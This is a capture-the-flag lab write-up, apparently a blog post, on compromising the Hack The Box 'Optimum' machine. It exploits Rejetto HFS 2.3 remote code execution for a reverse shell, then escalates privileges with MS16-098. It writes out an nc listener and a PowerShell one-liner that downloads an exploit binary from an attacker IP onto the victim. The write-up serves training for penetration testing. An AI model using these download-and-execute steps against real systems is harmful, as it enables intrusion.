---
layout: post
title:  "HTB - OPTIMUM - Without Metasploit"
date:   2021-01-11 20:07:19
categories: [HTB,Writeup,oscp-prep,windows,HFS 2.3, MS16–098]
comments: true
image:
  feature: ![infocard](https://raghul.ml/img/infocard.png)
---

Optimum is CVE based Windows machine. Full list of OSCP based HTB machines can be found [here](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)

Let's get started!

<!--more-->

### Recon
 
Started with [nmapAutomater](https://github.com/21y4d/nmapAutomator) and Rustscan for recon and found only port 80 was accessible



The port 80 host Rejetto HFS 2.3 (HTTP File Server 2.3).



Running searchsploit and found HFS 2.3 is vulnerable to remote code execution

### Initial foothold

Copy searchsploit found exploit to current directory.

`searchsploit -m windows/remote/39161.py`

*Understanding the exploit code:*

The code has 3 function running in an order:

1. script_Create(): Create a script which downloads nc from the attacker machine
2. execute_script(): which execute the above script with and download nc from the attacker machine
3. nc_run(): Runs the downloaded nc createing a reverse shell to the attacker machine




Locating windows nc from Kali Linux and copying it to the current directory:

Creating python3 HTTP server in the location :

`sudo python3 -m http.server 80`

Running nc listner on the attacker machine

'nc -nlvp 1234'

Executing the exploit code by modifying the local host and local port variable and we got user shell.

![user-shell]()

### Privilege escalation

Running systeminfo in the victim machine

Copy systeminfo from the victim machine to the attacker machine

Update windows-exploit suggester. By updating it will create an excel file as database.
Feed the database and system info to windows exploit suggester to know the available exploit for the current patch on the victim machine.

`~/tools/windows-exploit-suggester/exploitsuggestor.py --database '/home/kali/tools/windows-exploit-suggester/2021-01-11-mssb.xls' --systeminfo 'optimum_systeminfo.txt'`

Running the above we came to know that the machine is vulnerable for many exploit but we are using `MS16-098` for this machine. And the link for the exploit db is  https://www.exploit-db.com/exploits/41020/

The exploit has the pre-compiled binary file and downloaded it to the attacker machine.

Host the python3 HTTP Server

`python3 -m http.server 80'

In victim machine download the exploit binary where you have permission

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"`

Running the exploit gives us shell with NT/System Privilege
![root-shell]()


### Things I learnt from this machine

1. Take screenshot from the vm and save it in the corresponding machine folder
2. Spend some time in reading the exploit code and understand it before executing
3. The windows directory where we may have permission to execute is `c:\Users\Public\Downloads\`
4. Powershell to download in windows `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"`
5. Some of the windows executable are available in kali linux in the directory `usr/share/windows-binaries/`




